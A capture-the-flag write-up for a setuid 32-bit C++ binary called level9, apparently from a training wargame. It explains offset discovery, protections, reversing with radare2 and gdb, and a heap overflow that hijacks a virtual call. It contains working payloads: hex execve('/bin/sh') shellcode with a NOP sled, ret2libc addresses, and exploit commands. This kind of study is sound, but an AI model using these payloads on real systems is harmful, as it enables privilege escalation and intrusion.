-- Blackbox --
When we launch the program nothing happen, weird
Lets run it with a big input then see if something happen
`./level9 $(python -c "print 'A'*200")`, we get a segv, ok lets determine the offset
We can do it manually or with a De bruijn pattern or some sort of cyclic pattern
Lets generate one locally with `ragg2 -P 200 -r` `r2 -c wopD 200 0 -`
Send it as arg in ./level9 and `dmesg` to see where the address did segfault
Then send it as hex in the dummy r2 `wopO 0xSEGVADDR`, the offset is 108
We can verify this `./level9 $(python -c "print 'A'*108")` doesnt segv, `*109` does
Ok so we have a buffer that read av[1] somewhere, with no bound check apparently, situated at rbp-104 of its local stack frame prob
Lets analyse the binary

-- Protection --
```
Stripped = false
relro = no
aslr = no
pic = false
canary = false
nx = false
```
Ok there is nothing, we already know the offset at which the segv happen, we can just do a shellcode injection prob

-- Exploit --
Lets try blind, since pic and aslr are disabled, store a nop-sled and a shellcode in the stack in an env variable
`export SHELLCODE=$(python -c "print '\x90'*528 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")`
gdb->`start; x/5wx $ebp` = 0xbffff5ac `x/100wx $0xbffff5ac`, spot somewhere in the nopslide `0xbffff70c`
pack it and add it after the padding we previously found = `\x0c\xf7\xff\xbf`, lets run it
`./level9 $(python -c "print 'A'*108 + '\x0c\xf7\xff\xbf'")
It doesnt work, lets try a ret2libc `p &system` `p &exit` `find &system, +999999999, "/bin/sh"`
0xb7d86060, 0xb7d79be0, 0xb7ea7c58, pack it for 32 bit, doesnt work neither, lets analyse the binary

-- Static analysis --
The binary is a setuid x86 elf32 executable, written in c++, dynamically linked with libstdc++.so.6 and libc.so.6
`afl` to see which functions are analysable in the binary
```
0x0804869a    4     64 sym.__static_initialization_and_destruction_0_int__int_
0x080484d0    1      6 fcn.080484d0
0x080484b0    1      6 sym.imp.__cxa_atexit
0x080486da    1     28 sym._GLOBAL__sub_I_main
0x0804873a    1     19 method.N.operator_N_
0x0804874e    1     23 method.N.operator__N_
0x080486f6    1     23 method.N.N_int_
0x0804870e    1     44 method.N.setAnnotation_char_
0x08048520    1      6 sym.imp.strlen
0x08048510    1      6 sym.imp.memcpy
0x080485f4    3    166 main
0x080484f0    1      6 sym.imp._exit
0x08048530    1      6 sym.imp.operator_new_unsigned_int_
0x08048500    1      6 sym.imp.std::ios_base::Init::Init__
```
We see quite a lot of new thing since this is our first time reversing c++, lets take it step by step and try to recreate the source.cpp
`iE`, at least there is only the main we need to care about, `s main` `pdf` `pdg` `VV`

-- Name mangling --
r2 understand right away what are the symbol that the binary has, but in memory they are stored in the plt like any linked function
And they're loaded the same way, if we look at it from gdb we have weird symbol name like `_Znwj` 
What does it mean ? because even following the plt after loading is pretty hard to understand if its native c++ object constructor or anything difficult
Gnu has a tool called c++filt `c++filt _Znwj = operator new(unsigned int)` to demangle c++ symbols, its actually used by the linker from what i understand

All C++ function names are encoded into a low-level assembly label (this process is known as mangling)
The c++filt program does the inverse mapping: it decodes (demangles) low-level names into user-level names so that the linker can keep these overloaded functions from clashing

-- Functionnality --
Ok, static analysis is done (see source.cpp to see my last 8 hours of work)
It proved quite challenging without prior c++ and reverse c++ knowledge
But now that its over we can see what the program really is doing, and its really not much :
- Create two object of the same class that have the same size
- Set a private property through the constructor
- Overload the + operator to add both object property

-- Vulnerability --
Ok now lets understand why we segv on 108 like we saw earlier, run in gdb with few breakpoint and `i f` when we crash
Ah ! We're segfaulting on main+142 right after the memcpy in setAnnotation, the property was located at the end of the obj, but since we're writing from +4
We already overwrite the whole obj with 104, the next 4 are the addresses right after in memory
The issue is we're not overwriting any eip, we're segv because of the virtual call procedure to double dereference
Our stack pointer is at address 0xbffff580, but we dont store our value here, we store it at 0x0804a008
and with `i proc m` in gdb, we see that its a heap address, which make sens now that its printed, new malloc the obj

So thats why, 104 was the padding to overwrite the whole obj, 104-108 was to overwrite the heap header
108-112 was overwriting the first 4 byte of the next obj since its been malloc'd right after
And in the first 4 byte of the next obj there is the operator+ func ! Which is the thing we're trying to call with the double dereference for the virtual call

-- Exploit --
We understand where the code is vulnerable, lets build an exploit
// mov eax, dword [esp+0x10]    ; eax = new_ob
// mov eax, dword [eax]         ; This is where we segv
// mov edx, dword [eax]         ;
This virtual call procedure makes a double reference, and we call the last value, so my previous exploit attempts at the beginning
Were trying to interpret the /x90/x90/x90/x90 as an address to jump to to begin execution
Then lets negate this by providing an address to our address, and where do we have the rights to write ? In obj+4
Lets start the padding by providing the address of our shellcode, that we currently have at the end
And replace the address at the end with the address of obj+4
The shellcode i tried at the beginning in this video segv but with another it works !

`scp -P 4242 Ressources/exploit.py level9@127.0.0.1:/tmp/exploit.py`
`export SHELLCODE=$(python -c "print '\x90'*512 + '\x31\xc0\x50\x48\x8b\x14\x24\xeb\x10\x54\x78\x06\x5e\x5f\xb0\x3b\x0f\x05\x59\x5b\x40\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff/bin/sh'")`
`./level9 $(python /tmp/exploit.py)`
